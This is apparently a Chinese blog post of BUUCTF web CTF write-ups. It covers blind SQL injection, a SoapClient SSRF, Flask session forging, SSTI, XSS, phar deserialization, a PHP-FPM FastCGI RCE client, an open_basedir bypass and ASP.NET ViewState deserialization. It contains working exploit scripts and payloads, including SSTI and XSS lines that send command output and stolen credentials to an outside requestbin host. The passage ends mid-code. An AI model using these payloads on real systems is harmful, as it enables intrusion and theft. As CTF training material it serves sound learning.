---

title: BUUCTF Web Writeup Part2 <中等部分>
categories:
  - 平台Writeup
tags:
  - ctf
  - Web
  - Writeup
index_img: /img/used/prac.jpg
date: 2020-04-24 19:25:33

---

# BUUCTF Web Part2

## [De1CTF 2019]ShellShellShell[unsolved]

### 知识点

+ SQLI 时间盲注
+ 源码泄露
+ 代码审计
+ 反序列化：SOAP利用
+ SSRF

### Writeup

经过一番尝试，发现`index.php~`类型的源码泄露，通过index.php进一步得到config和user的php，写个脚本把action都download下来

```python
import requests
import os

file_list = "delete|index|login|logout|phpinfo|profile|publish|register".split("|")
for k in file_list:
    s = requests.get("http://36af33a2-d950-4e26-8b19-a7033b437688.node3.buuoj.cn/views/"+k)
    st = s.text
    with open(k,'w') as f:
        f.write(st)
```

然后开始审计。

拿到源码首先肯定是要看公共类的，直接查看config类，发现全局过滤处理：所有传入的参数都经过了addslashes处理。

```php
function addslashes_deep($value)// 把参数或数组全都addslashes
function addsla_all()//把GET POST REQUESTS COOKIES 全都addslashes_deep

addsla_all();
```

接下来看SQL操作，重点看这两个方法，注意`[!]`处的注释，insert和select有通过输入反引号逃逸的可能。

```php
private function get_column($columns) //反引号包裹变量
# a,b -> `a`,`b`
# a`b -> `a`b`
  
public function select($columns,$table,$where) {
        $column = $this->get_column($columns);#反引号包裹
        $sql = 'select '.$column.' from '.$table.' where '.$where.';';#直接拼接
        $result = $this->conn->query($sql);
        return $result;
    }

public function insert($columns,$table,$values){
        $column = $this->get_column($columns);#反引号包裹
        # 反引号中变量替换成引号包裹，遇到反引号和逗号会停止解析
        # `a`,`b` -> 'a','b'
        # `a`b` , `c` -> 'a'b`,`c` -> 'a'b','c`  [!]<-------
  			#再加个括号
        $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
        $sql = 'insert into '.$table.'('.$column.') values '.$value;
        $result = $this->conn->query($sql);
        return $result;
    }
```

select被引用的四处函数，不是变量不可控就是被单引号包裹，无法利用。

寻找insert的引用，发现publish函数中:`$_POST['signature']`可控，而mood和username和userid均不可控。

```php
$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));

@$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
```

那么可以构造注入：

```
a` or sleep(5),`1`)#
语句变成
( '...','a' or sleep(5),'1')#` ) 就可以达到延迟效果了。
```

编写脚本盲注即可。

> 注意：在盲注语句 where username = 0x6164...这里，不能直接写username=admin，要加单引号的。如果不加单引号或者被过滤了，就要使用把admin转换为十六进制的方法。

```python
import requests
import time

s = requests.session()
charset = "0123456789abcdef"
url = "http://36af33a2-d950-4e26-8b19-a7033b437688.node3.buuoj.cn/index.php?action=publish"
cookie = {"PHPSESSID":"607qob7o65qufn6r03v47fum44"}
passwd = ""
# md532位
for i in range(1,33):
    for j in charset:
        code = "sleep(if(ascii(substr((select password from ctf_users where username =0x61646d696e),{},1)) = {},2,0))".format(i,ord(j))
        payload = "a` or sleep("+code+"),`1`)#"
        #61646d696e是admin的HEX
        data = {'signature':payload,'mood':0}
        time0 = time.time()
        q = s.post(url,cookies=cookie,data=data)
        time1 = time.time() 
        if time1 - time0 > 2:
            passwd += j
            print(passwd)
            break
```

得到结果

```
c991707fdf339958eded91331fb11ba0
解密一下
jaivypassword
```

然后就可以admin登陆了。但是需要本地ip，前面看到IP的验证是通过Remote_Addr，那么思路有两个：一个是改数据库使得可以异地IP登录，一个是SSRF。先看看能不能改数据库：

```php
$res = @$C->allow_diff_ip_option();#是唯一能够改ip设置的函数，只有adio可控

 function allow_diff_ip_option()#is_admin没有办法伪造，它在session中
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {...}
        else
            echo 'admin can\'t change this option';
            return false;
    }
```

显然是改不了的，只能想办法SSRF。如何SSRF呢？常见办法有curl，SOAPClient，前者在业务逻辑中没有体现，于是我们寻找有没有反序列化漏洞。首先可以先去phpinfo确认一下：

```
 soap 
 Soap Client => enabled 
 Soap Server => enabled 
```

这印证了我们的思路。寻找一下反序列化漏洞吧，搜索unserialize注意到：

```php
  function showmess(){
    //...//
            @$ret = $db->select(array('username','signature','mood','id'),'ctf_user_signature',"userid = $this->userid order by id desc");
            if($ret) {
                $data = array();
                while ($row = $ret->fetch_row()) {
                    $sig = $row[1];
                    $mood = unserialize($row[2]);//<----------可以注入
                    $country = $mood->getcountry();//<------调用一个方法
                    //...
```

这个row[2]就是我们刚才的位置，这样构造就可以注入对象了

```
a` ,{object});#
会变成
( 'a','a' ,{object});#` )  
```

然后寻找利用点，我们知道：传入一个soapclient对象并被反序列化，接着调用它的不存在的`getcountry()`方法会触发`__call()`魔术方法。

下面简介SOAPClient的利用方法：

```
重要函数
public SoapClient::__construct ( mixed $wsdl [, array $options ] )
根据文档，我们应当让wsdl为NULL，工作在non-wsdl模式，然后传递option参数。
public SoapClient::__call ( string $function_name , array $arguments ) : mixed
```

编写脚本如下：其中利用CRLF注入UA实现POST请求

```

<?php
$p = array(
    'uri' => "http://127.0.0.1/\x0d\x0aContent-Length: 0\x0d\x0a\x0d\x0a\x0d\x0aPOST /login HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aCookie: PHPSESSID=rfiaqul0ek01lgvsbgg1pls252\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 42\x0d\x0a\x0d\x0ausername=admin&password=jaivypassword&code=19123\x0d\x0a\x0d\x0aPOST /foo",
    'location' => 'http://127.0.0.1/'
);
$soap = new SoapClient(null, $p);
$serial_soap = serialize($soap);
echo "a`,0x".bin2hex($serial_soap).")#";
?>
```

然后构造注入,这里怎么注入都不能变成admin...

## [CISCN2019 华东南赛区]Web4

这个路由看起来比较奇怪

```
http://204beb86-3f13-4062-b773-8be53e047871.node3.buuoj.cn/read?url=http://www.baidu.com
```

试了一下`file`协议显示NoHack，使用`ffile`则显示no response，使用`filee`显示NoHack，说明是开头的过滤。在开头加个空格就可以bypass

```
http://204beb86-3f13-4062-b773-8be53e047871.node3.buuoj.cn/read?url= file:///etc/passwd
```

可以任意文件读取，尝试获得代码。这个路由形式比较像python，碰一下运气读取`/app/app.py`

```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
...

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

可以看到几个关键点：要改变session中username的值，debug模式开了，SECRET_KEY随机生成。我们自然要追究session生成的原理。

参考资料

+ [通过secretkey 绕过flask的session认证](https://www.secpulse.com/archives/97707.html)

可以看到，session用`.`分成三部分

```
eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XqgJuQ.qOB42NAXFt4IULVYf3cHqnP8JN0
```

第一部分是数据

第二部分是时间戳

第三部分是安全签名，将session data,时间戳，和flask的secretkey通过sha1运算的结果。注意到

```python
random.seed(uuid.getnode())
#getnode:获取主机的硬件地址
app.config['SECRET_KEY'] = str(random.random()*233)
```

于是任意文件读取到Mac地址

```
url=%20file:///sys/class/net/eth0/address
02:42:ae:00:cf:74 
```

注意到题目是使用python2写的，python2和3对于随机数的处理方式不同，所以我们也编写python2脚本

```python
import random
random.seed(0x0242ae00cf74)
print(str(random.random()*233))
#178.693523774
```

使用工具Flask Session Cookie Decoder/Encoder 加解密。注意：第一部分一定不要自己写base64加解密，要用脚本的，否则解密的数据会不一致！

```bash
python flask_session_cookie_manager2.py decode -s "178.693523774" -c "eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XqgJuQ.qOB42NAXFt4IULVYf3cHqnP8JN0"
> {u'username': 'www-data'}
替换一下
> {u'username': 'fuck'}

python flask_session_cookie_manager2.py encode -t "{u'username': 'fuck'}" -s "178.693523774"
> eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.XqgWuQ.eeFwwGADxLLQlURn9ONBUksDKq0
```

替换一下浏览器session，访问`/flag`就可以了。

`flag{991f59ae-06e4-47b1-b610-5b62ea9b9745}`

## [GWCTF 2019]你的名字

这题好坑...是python flask 却给了index.php的路由和php的报错。。

我们来尝试一下，发现

```
{{  和  }} 会引起错误
一些常见单词被过滤，比如config，os，if ...并且双写三写 ooosss 都不行，说明是循环过滤。
但有一个很有意思的现象： oifs就会变成os,而iosf就变为空，说明过滤逻辑有点问题
```

猜测过滤逻辑为

```python
black_list = [a,b,c,d]
for word in black_list:
	while word in line:
		line = line.replace(word,'')
```

这样会导致一个漏洞：如果单词word1在word2的前面，则woword2rd1不会被替换为空，只会变成word1。也就是说利用后面的单词可以插入在前面单词的中间，那么只需要找到黑名单的最后一个单词就可以了。

因为双括号被过滤，所以只能用

```
{% if ... %}xxx{% endif %}
```

这样的模板结构，在if中执行语句，回显可以用带外通道。首先得找到带外通道所属的类

```
{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[*].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://yourip:port/') %}1{% endiconfigf %}
```

fuzz一下发现是第59个类。于是（比起用自己的服务器，搞个`requestbin`更好哦

```
{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http://http.requconfigestbin.buuoj.cn/1eft3il1 -d `ls / | grep flag`;') %}1{% endiconfigf %}
```

得到文件名就可以

```
{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http://http.requconfigestbin.buuoj.cn/1eft3il1 -d `cat /flag_1s_Hera`;') %}1{% endiconfigf %}
```

RequestBin真的超好用！

![](https://ww1.yunjiexi.club/2020/04/28/JVHhg.png)

## [GWCTF 2019]mypassword

注册登陆之后发现典型xss漏洞，表单提交处似乎不能SQL注入。

在feedback.php处发现了注释

```php
<!-- 
			if(is_array($feedback)){
				echo "<script>alert('反馈不合法');</script>";
				return false;
			}
			$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
			foreach ($blacklist as $val) {
		        while(true){
		            if(stripos($feedback,$val) !== false){
		                $feedback = str_ireplace($val,"",$feedback);
		            }else{
		                break;
		            }
		        }
		    }
		    -->
```

这个黑名单的逻辑和上个题（你的名字）一样，但我们还需要用到cookie这个关键词。网站不能引入外部js，于是看看内部js中有没有操作cookie的。

在登录界面发现了一个login.js，这里面有解析cookie的方法，于是引入这个就可以了。

```javascript
//login.js
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}
}
```

只需要构造两个表单就可以。

```javascript
<inpcookieut type="text" name="username"></inpcookieut>
<inpcookieut type="text" name="password"></inpcookieut>
<scricookiept scookierc="./js/login.js"></scricookiept>
<scricookiept>
	var uname = documcookieent.getElemcookieentsByName("username")[0].value;
	var passwd = documcookieent.getElemcookieentsByName("password")[0].value;
	var res = uname + " " + passwd;
	documcookieent.locacookietion="http://http.requestbin.buuoj.cn/1eft3il1?a="+res;
</scricookiept>
```

依然用RequestBin带出即可

```
GET /1eft3il1?a=admin flag{42eb732d-cadd-4ae3-b665-f9840652170a}
```

## [NCTF2019]phar matches everything

源码泄露：catchmime.php，buuoj上并没泄露，源码如下

```php
<?php
class Easytest{
    protected $test;
    public function funny_get(){
        return $this->test;
    }
}
class Main {
    public $url;
    public function curl($url){
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        $output=curl_exec($ch);
        curl_close($ch);
        return $output;
    }

    public function __destruct(){
        $this_is_a_easy_test=unserialize($_GET['careful']);
        if($this_is_a_easy_test->funny_get() === '1'){
            echo $this->curl($this->url);
        }
    }    
}

if(isset($_POST["submit"])) {
    $check = getimagesize($_POST['name']);
    if($check !== false) {
        echo "File is an image - " . $check["mime"] . ".";
    } else {
        echo "File is not an image.";
    }
}
?>
```

一看就是传个Phar，先写个Phar

```php
<?php
class Easytest{
    protected $test = "1";
  //注意Main类中判断是三个等号，这里应该是字符串
    public function funny_get(){
        return $this->test;
    }
}
class Main {
    public $url = "file:///etc/hosts";
       
}
$ez = new Easytest();
echo (urlencode(serialize($ez)));

@unlink('phar.phar');
$p = new Phar('phar.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a'.'<?php __HALT_COMPILER(); ?>');
$ma = new Main();
$p->setMetadata($ma);
$p->addFromString('a.txt','a');
$p->stopBuffering();

?>
```

再写个exp试试。因为有curl所以看起来很像SSRF

```python
import requests

url = "http://dfb873fa-ebc2-4033-8889-ce52a87a4ec7.node3.buuoj.cn/catchmime.php"\
    "?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D"

data = {
    'name':'phar://uploads/58b8d77472.gif',
    'submit':'1'
}

r=requests.post(url,data=data)
print(r.text)
```

读取到内网主机

```
127.0.0.1  localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
173.226.134.9   osrc
```

又到了不知为何的打内网时间...在正常的渗透过程中，要枚举C段，枚举端口，但这道题比较友好，我们只需要接下来访问`173.226.134.10 `，就可以得到

```
powered by good PHP-FPM
```

明显提示，我们搜索一下fpm的漏洞。有一个php7的fpmRCE漏洞。再一看返回的头部

```
'X-Powered-By': 'PHP/7.0.33'
```

印证了我们的猜想。于是寻找漏洞利用的exp。

参考资料：[Phithon的php-fpm解析](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

找到脚本

```python
import socket
import random
import argparse
import sys
from io import BytesIO
import base64
import urllib

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False

def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s

class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''

            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def gopher(self, nameValuePairs={}, post=''):

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
        return request

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php echo "PWNed";?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)
    parser.add_argument('-e', '--ext', help='ext absolute path', default='')
    parser.add_argument('-if', '--include_file', help='evil.php absolute path', default='')
    parser.add_argument('-u', '--url_format', help='generate gopher stream in url format', nargs='?',const=1)
    parser.add_argument('-b', '--base64_format', help='generate gopher stream in base64 format', nargs='?',const=1)

    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(args.code),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }

    if args.ext and args.include_file:
        #params['PHP_ADMIN_VALUE']='extension = '+args.ext
        params['PHP_ADMIN_VALUE']="extension_dir = /var/www/html\nextension = ant.so"
        params['PHP_VALUE']='auto_prepend_file = '+args.include_file
    if not args.url_format and not args.base64_format :
        response = client.request(params, args.code)
        print(force_text(response))
    else:
        response = client.gopher(params, args.code)
        if args.url_format:
            print(urllib.quote(response))
        if args.base64_format:
            print(base64.b64encode(response))
```

然后执行（php-fpm默认监听9000

```
python fpm.py 173.226.134.10 /var/www/html/index.php -p 9000 -c "<?php phpinfo();?>" -u
```

生成gopher协议

```
gopher://173.226.134.10:9000/_%01%01%D6%D0%00%08%00%00%00%01%00%00%00%00%00%00%01%04%D6%D0%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%D6%D0%00%00%00%00%01%05%D6%D0%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%D6%D0%00%00%00%00
```

看到限制了open_basedir，还有disable_functions，要想办法突破文件夹限制。由于已经做到RCE，直接尝试设置ini_set

```php
<?php ini_set('open_basedir','/');echo(file_get_contents('/flag'));?>
                                       
python fpm.py 173.226.134.10 /var/www/html/index.php -p 9000 -c "<?php ini_set('open_basedir','/');echo(file_get_contents('/flag'));?>" -u
```

（这样是不好使的

网上看到一个bypass方式，这里直接使用，在另一篇博客更新bypass的分析。

资料:[bypass open_basedir的新方法](https://xz.aliyun.com/t/4720)

```php
<?php mkdir('new');chdir('new');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));?>
  
 python fpm.py 173.226.134.10 /var/www/html/index.php -p 9000 -c "<?php mkdir('new');chdir('new');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));?>" -u 
```

`flag{ee1a04cc-352c-49ae-b81a-5f5cf939bdae}`

## [HITCON 2018]Why-So-Serials

source

```asp
<%@ Page Language="C#" %>
<script runat="server">
    protected void Button1_Click(object sender, EventArgs e) {
        if (FileUpload1.HasFile) {
            try {
                System.Web.HttpContext context = System.Web.HttpContext.Current;
                String filename = FileUpload1.FileName;
                String extension = System.IO.Path.GetExtension(filename).ToLower();
                String[] blacklists = {".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap", ".vbhtm", ".vbhtml", ".asa", ".asp", ".cer"};
                if (blacklists.Any(extension.Contains)) {
                    Label1.Text = "What do you do?";
                } else {
                    String ip = context.Request.ServerVariables["REMOTE_ADDR"];
                    String upload_base = Server.MapPath("/") + "files/" + ip + "/";
                    if (!System.IO.Directory.Exists(upload_base)) {
                        System.IO.Directory.CreateDirectory(upload_base);
                    }

                    filename = Guid.NewGuid() + extension;
                    FileUpload1.SaveAs(upload_base + filename);

                    Label1.Text = String.Format("<a href='files/{0}/{1}'>This is file</a>", ip, filename);
                }
            }
            catch (Exception ex)
            {
                Label1.Text = "ERROR: " + ex.Message.ToString();
            }
        } else {
            Label1.Text = "You have not specified a file.";
        }
    }
</script>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="stylesheet" type="text/css" href="bootstrap.min.css">
    <title>Why so Serials?</title>
</head>
<body>
  <div class="container">
    <div class="jumbotron" style='background: #f7f7f7'>
        <h1>Why so Serials?</h1>
        <p>May the <b><a href='Default.aspx.txt'>source</a></b> be with you!</p>
        <br />
        <form id="form1" runat="server">
            <div class="input-group">
                <asp:FileUpload ID="FileUpload1" runat="server" class="form-control"/>
                <span class="input-group-btn">
                    <asp:Button ID="Button1" runat="server" OnClick="Button1_Click"
                 Text="GO" class="btn"/>
                </span>
            </div>
            <br />
            <br />
            <br />
            <div class="alert alert-primary text-center">
                <asp:Label ID="Label1" runat="server"></asp:Label>
            </div>
        </form>
    </div>
  </div>
</body>
</html>
```

这题是asp题目，我对asp了解为零...只好看[wp](https://cyku.tw/ctf-hitcon-2018-why-so-serials/)学操作了。

首先题目过滤了很多后缀，如wp开始部分所叙述的，有一种办法可以查看各种后缀被IIS处理的方法，即IIS的Handler Mapping。

发现列表中并没有禁用`.stm`, `.shtm`和`.shtml`三种文件格式, 于是我们可以通过这个两种文件来进行SSI(Server Side Include), 从而读取web.config（IIS配置文件）。

```
<!-- test.shtml -->
<!--#include file="/web.config" -->
```

读取下来

```html
<configuration>
<system.web>
<customerrors mode="Off">
    <machinekey validationkey="b07b0f97365416288cf0247cffdf135d25f6be87" decryptionkey="6f5f8bd0152af0168417716c0ccb8320e93d0133e9d06a0bb91bf87ee9d69dc3" decryption="DES" validation="MD5">
</machinekey></customerrors></system.web>
</configuration>
```

看到了熟悉的validation key，显然是view state的反序列化漏洞。

https://www.4hou.com/posts/GYq7（漏洞介绍）

 https://github.com/pwntester/ysoserial.net （利用工具）

https://github.com/0xacb/viewgen.git（利用工具）

[解码ViewState的网站](https://www.secshi.com/goto/hyh9)

ViewState参数([参考链接](https://www.secshi.com/goto/bc6d))

viewstate是前端传入了加密参数到后端，后端进行反序列化，于是我们可以主动构造这个参数。(修改default.aspx，viewgen进行操作)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Runtime.Serialization" %>
<%@ Import Namespace="System.Web.UI" %>
<%@ Import Namespace="System.Linq" %>
<script runat="server">
    protected void Button1_Click(object sender, EventArgs e) {
        if (FileUpload1.HasFile) {
            try {
                System.Web.HttpContext context = System.Web.HttpContext.Current;
                String filename = FileUpload1.FileName;
                String extension = System.IO.Path.GetExtension(filename).ToLower();
                String[] blacklists = {".aspx", ".config", ".ashx", ".asmx", ".aspq", ".axd", ".cshtm", ".cshtml", ".rem", ".soap", ".vbhtm", ".vbhtml", ".asa", ".asp", ".cer"};
